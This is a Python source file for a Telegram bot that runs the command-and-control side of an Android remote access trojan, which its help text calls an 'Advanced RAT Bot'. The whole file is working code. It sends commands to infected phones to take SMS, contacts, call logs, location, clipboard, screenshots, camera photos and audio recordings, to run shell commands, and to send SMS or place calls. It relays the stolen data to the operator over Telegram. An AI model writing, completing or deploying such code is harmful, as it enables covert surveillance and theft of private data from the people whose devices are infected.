"""
Advanced Telegram Bot Integration for Remote Device Management
Supports all commands, file transfers, and real-time monitoring
"""

import os
import json
import time
import threading
import requests
from datetime import datetime


class TelegramBot:
    """Complete Telegram Bot for device management"""
    
    def __init__(self, bot_token, admin_chat_id):
        self.bot_token = bot_token
        self.admin_chat_id = admin_chat_id
        self.base_url = f"https://api.telegram.org/bot{bot_token}"
        self.last_update_id = 0
        self.running = False
        self.devices = {}
        self.command_queue = {}
        
    def start(self):
        """Start the bot polling loop"""
        self.running = True
        threading.Thread(target=self._poll_loop, daemon=True).start()
        print(f"🤖 Telegram Bot started, monitoring chat: {self.admin_chat_id}")
        
    def stop(self):
        """Stop the bot"""
        self.running = False
        
    def _poll_loop(self):
        """Main polling loop for receiving commands"""
        while self.running:
            try:
                updates = self.get_updates()
                if updates:
                    for update in updates:
                        self.process_update(update)
                time.sleep(1)
            except Exception as e:
                print(f"Error in poll loop: {e}")
                time.sleep(5)
    
    def get_updates(self, timeout=30):
        """Get new updates from Telegram"""
        try:
            params = {
                'offset': self.last_update_id + 1,
                'timeout': timeout
            }
            response = requests.get(f"{self.base_url}/getUpdates", params=params, timeout=timeout+5)
            data = response.json()
            
            if data.get('ok') and data.get('result'):
                updates = data['result']
                if updates:
                    self.last_update_id = updates[-1]['update_id']
                return updates
        except Exception as e:
            print(f"Error getting updates: {e}")
        return []
    
    def process_update(self, update):
        """Process incoming update"""
        try:
            if 'message' in update:
                message = update['message']
                chat_id = message['chat']['id']
                
                # Only process messages from admin
                if str(chat_id) != str(self.admin_chat_id):
                    return
                
                if 'text' in message:
                    self.handle_text_command(chat_id, message['text'])
                elif 'document' in message:
                    self.handle_document(chat_id, message['document'])
                elif 'photo' in message:
                    self.handle_photo(chat_id, message['photo'])
                    
        except Exception as e:
            print(f"Error processing update: {e}")
    
    def handle_text_command(self, chat_id, text):
        """Handle text commands"""
        try:
            text = text.strip()
            
            # Help command
            if text == '/start' or text == '/help':
                self.send_help_message(chat_id)
                return
            
            # List devices
            if text == '/devices':
                self.send_devices_list(chat_id)
                return
            
            # Parse command format: /command device_id [params]
            parts = text.split(maxsplit=2)
            if len(parts) < 2:
                self.send_message(chat_id, "❌ Invalid command format. Use: /command device_id [params]")
                return
            
            command = parts[0][1:]  # Remove /
            device_id = parts[1]
            params = parts[2] if len(parts) > 2 else ""
            
            # Execute command
            result = self.execute_device_command(device_id, command, params)
            self.send_message(chat_id, result)
            
        except Exception as e:
            self.send_message(chat_id, f"❌ Error: {str(e)}")
    
    def send_help_message(self, chat_id):
        """Send help message with all available commands"""
        help_text = """
🤖 **Advanced RAT Bot Commands**

📱 **Device Management:**
/devices - List all connected devices
/status device_id - Get device status

📊 **Data Collection:**
/collect device_id - Collect all data
/location device_id - Get GPS location
/contacts device_id - Get contact list
/sms device_id - Get SMS messages
/calls device_id - Get call logs
/apps device_id - Get installed apps
/info device_id - Get device info

📸 **Media Capture:**
/screenshot device_id - Capture screenshot
/camera device_id - Capture photo
/audio device_id [seconds] - Record audio

📁 **File Operations:**
/list device_id [path] - List files
/download device_id path - Download file
/upload device_id - Upload file (send file after)
/search device_id pattern - Search files
/delete device_id path - Delete file

💬 **Communication:**
/sendsms device_id number message - Send SMS
/call device_id number - Make call
/clipboard device_id - Get clipboard
/setclip device_id text - Set clipboard

⚙️ **System Control:**
/shell device_id command - Execute shell
/wifi device_id - Get WiFi networks
/reboot device_id - Reboot device
/uninstall device_id package - Uninstall app

📤 **Data Export:**
/export device_id - Export all data as ZIP
/report device_id - Generate full report

Use format: /command device_id [parameters]
Example: /screenshot SM-G950F_123456
"""
        self.send_message(chat_id, help_text)
    
    def send_devices_list(self, chat_id):
        """Send list of connected devices"""
        try:
            # Get devices from Flask API
            response = requests.get('http://127.0.0.1:5000/api/bot/devices', timeout=5)
            data = response.json()
            
            if data.get('success'):
                devices = data.get('devices', [])
                if devices:
                    message = "📱 **Connected Devices:**\n\n"
                    for device in devices:
                        device_id = device.get('device_id', 'Unknown')
                        last_seen = device.get('last_seen', 'Never')
                        message += f"🔹 {device_id}\n   Last seen: {last_seen}\n\n"
                    self.send_message(chat_id, message)
                else:
                    self.send_message(chat_id, "No devices connected yet")
            else:
                self.send_message(chat_id, "Error retrieving devices")
        except Exception as e:
            self.send_message(chat_id, f"Error: {str(e)}")
    
    def execute_device_command(self, device_id, command, params):
        """Execute command on device via Flask API"""
        try:
            # Map command to API command type
            command_mapping = {
                'collect': 'collect_data',
                'location': 'get_location',
                'contacts': 'get_contacts',
                'sms': 'get_sms',
                'calls': 'get_call_logs',
                'apps': 'get_installed_apps',
                'info': 'get_device_info',
                'screenshot': 'capture_screenshot',
                'audio': 'capture_audio',
                'list': 'list_files',
                'download': 'upload_file',
                'search': 'search_files',
                'sendsms': 'send_sms',
                'call': 'make_call',
                'clipboard': 'get_clipboard',
                'setclip': 'set_clipboard',
                'shell': 'execute_shell',
                'wifi': 'get_wifi_networks'
            }
            
            api_command = command_mapping.get(command)
            if not api_command:
                return f"❌ Unknown command: {command}"
            
            # Parse parameters based on command
            command_params = self.parse_command_params(command, params)
            
            # Send command to Flask API
            payload = {
                'device_id': device_id,
                'type': api_command,
                'params': command_params
            }
            
            response = requests.post(
                'http://127.0.0.1:5000/api/bot/send_command',
                json=payload,
                timeout=10
            )
            
            data = response.json()
            if data.get('success'):
                command_id = data.get('command_id')
                return f"✅ Command sent successfully!\nCommand ID: {command_id}\nDevice: {device_id}\nCommand: {command}"
            else:
                return f"❌ Error: {data.get('error', 'Unknown error')}"
                
        except Exception as e:
            return f"❌ Error executing command: {str(e)}"
    
    def parse_command_params(self, command, params_str):
        """Parse command parameters"""
        params = {}
        
        if command == 'audio':
            params['duration'] = int(params_str) if params_str else 10
        elif command == 'list':
            params['path'] = params_str if params_str else '/sdcard'
        elif command == 'download' or command == 'delete':
            params['path'] = params_str
        elif command == 'search':
            params['pattern'] = params_str
        elif command == 'sendsms':
            parts = params_str.split(maxsplit=1)
            if len(parts) >= 2:
                params['number'] = parts[0]
                params['message'] = parts[1]
        elif command == 'call':
            params['number'] = params_str
        elif command == 'setclip':
            params['text'] = params_str
        elif command == 'shell':
            params['command'] = params_str
            
        return params
    
    def handle_document(self, chat_id, document):
        """Handle file upload to device"""
        try:
            file_id = document['file_id']
            file_name = document['file_name']
            
            # Get file path from Telegram
            file_info = self.get_file(file_id)
            if not file_info:
                self.send_message(chat_id, "❌ Failed to get file info")
                return
            
            file_path = file_info.get('file_path')
            file_url = f"https://api.telegram.org/file/bot{self.bot_token}/{file_path}"
            
            # Download file
            response = requests.get(file_url)
            if response.status_code == 200:
                # Save file temporarily
                temp_path = f"/tmp/{file_name}"
                with open(temp_path, 'wb') as f:
                    f.write(response.content)
                
                self.send_message(chat_id, f"✅ File received: {file_name}\nUse /push device_id to send to device")
            else:
                self.send_message(chat_id, "❌ Failed to download file")
                
        except Exception as e:
            self.send_message(chat_id, f"❌ Error handling file: {str(e)}")
    
    def handle_photo(self, chat_id, photo):
        """Handle photo upload"""
        try:
            # Get largest photo size
            photo = max(photo, key=lambda p: p['file_size'])
            file_id = photo['file_id']
            
            # Get file path
            file_info = self.get_file(file_id)
            if not file_info:
                self.send_message(chat_id, "❌ Failed to get photo info")
                return
            
            file_path = file_info.get('file_path')
            file_url = f"https://api.telegram.org/file/bot{self.bot_token}/{file_path}"
            
            # Download photo
            response = requests.get(file_url)
            if response.status_code == 200:
                timestamp = int(time.time())
                temp_path = f"/tmp/photo_{timestamp}.jpg"
                with open(temp_path, 'wb') as f:
                    f.write(response.content)
                
                self.send_message(chat_id, f"✅ Photo received\nUse /push device_id to send to device")
            else:
                self.send_message(chat_id, "❌ Failed to download photo")
                
        except Exception as e:
            self.send_message(chat_id, f"❌ Error handling photo: {str(e)}")
    
    def get_file(self, file_id):
        """Get file information from Telegram"""
        try:
            response = requests.get(f"{self.base_url}/getFile", params={'file_id': file_id})
            data = response.json()
            if data.get('ok'):
                return data.get('result')
        except Exception as e:
            print(f"Error getting file: {e}")
        return None
    
    def send_message(self, chat_id, text):
        """Send text message"""
        try:
            data = {
                'chat_id': chat_id,
                'text': text,
                'parse_mode': 'Markdown'
            }
            response = requests.post(f"{self.base_url}/sendMessage", json=data, timeout=10)
            return response.json()
        except Exception as e:
            print(f"Error sending message: {e}")
            return None
    
    def send_photo(self, chat_id, photo_path, caption=None):
        """Send photo to Telegram"""
        try:
            with open(photo_path, 'rb') as photo:
                files = {'photo': photo}
                data = {'chat_id': chat_id}
                if caption:
                    data['caption'] = caption
                
                response = requests.post(
                    f"{self.base_url}/sendPhoto",
                    files=files,
                    data=data,
                    timeout=30
                )
                return response.json()
        except Exception as e:
            print(f"Error sending photo: {e}")
            return None
    
    def send_document(self, chat_id, document_path, caption=None):
        """Send document to Telegram"""
        try:
            with open(document_path, 'rb') as document:
                files = {'document': document}
                data = {'chat_id': chat_id}
                if caption:
                    data['caption'] = caption
                
                response = requests.post(
                    f"{self.base_url}/sendDocument",
                    files=files,
                    data=data,
                    timeout=60
                )
                return response.json()
        except Exception as e:
            print(f"Error sending document: {e}")
            return None
    
    def send_location(self, chat_id, latitude, longitude):
        """Send location to Telegram"""
        try:
            data = {
                'chat_id': chat_id,
                'latitude': latitude,
                'longitude': longitude
            }
            response = requests.post(f"{self.base_url}/sendLocation", json=data, timeout=10)
            return response.json()
        except Exception as e:
            print(f"Error sending location: {e}")
            return None
    
    def notify_data_received(self, device_id, data_type, data):
        """Notify admin when data is received from device"""
        try:
            message = f"📥 **Data Received**\n\n"
            message += f"Device: {device_id}\n"
            message += f"Type: {data_type}\n"
            message += f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            
            # Handle different data types
            if data_type == 'location' and isinstance(data, dict):
                lat = data.get('latitude')
                lon = data.get('longitude')
                if lat and lon:
                    message += f"Location: {lat}, {lon}\n"
                    message += f"Maps: https://maps.google.com/?q={lat},{lon}"
                    self.send_message(self.admin_chat_id, message)
                    self.send_location(self.admin_chat_id, lat, lon)
                    return
            
            # For other data types, send as file
            if isinstance(data, (dict, list)):
                # Save data to file
                filename = f"{device_id}_{data_type}_{int(time.time())}.json"
                filepath = f"/tmp/{filename}"
                with open(filepath, 'w') as f:
                    json.dump(data, f, indent=2)
                
                self.send_message(self.admin_chat_id, message)
                self.send_document(self.admin_chat_id, filepath, f"{data_type} data")
                os.remove(filepath)
            else:
                message += f"Data: {str(data)[:500]}"
                self.send_message(self.admin_chat_id, message)
                
        except Exception as e:
            print(f"Error notifying data received: {e}")
    
    def notify_screenshot(self, device_id, screenshot_path):
        """Notify admin when screenshot is received"""
        try:
            caption = f"📸 Screenshot from {device_id}\n{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            self.send_photo(self.admin_chat_id, screenshot_path, caption)
        except Exception as e:
            print(f"Error notifying screenshot: {e}")
    
    def notify_file_received(self, device_id, file_path):
        """Notify admin when file is received from device"""
        try:
            caption = f"📁 File from {device_id}\n{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            self.send_document(self.admin_chat_id, file_path, caption)
        except Exception as e:
            print(f"Error notifying file received: {e}")
    
    def notify_device_connected(self, device_id, device_info):
        """Notify admin when new device connects"""
        try:
            message = f"🆕 **New Device Connected**\n\n"
            message += f"Device ID: {device_id}\n"
            
            if isinstance(device_info, dict):
                message += f"Model: {device_info.get('model', 'Unknown')}\n"
                message += f"Android: {device_info.get('android_version', 'Unknown')}\n"
                message += f"Manufacturer: {device_info.get('manufacturer', 'Unknown')}\n"
            
            message += f"\nTime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            self.send_message(self.admin_chat_id, message)
        except Exception as e:
            print(f"Error notifying device connected: {e}")
    
    def notify_command_result(self, device_id, command, result, status):
        """Notify admin of command execution result"""
        try:
            emoji = "✅" if status == "success" else "❌"
            message = f"{emoji} **Command Result**\n\n"
            message += f"Device: {device_id}\n"
            message += f"Command: {command}\n"
            message += f"Status: {status}\n"
            message += f"Result: {str(result)[:500]}\n"
            message += f"\nTime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            
            self.send_message(self.admin_chat_id, message)
        except Exception as e:
            print(f"Error notifying command result: {e}")
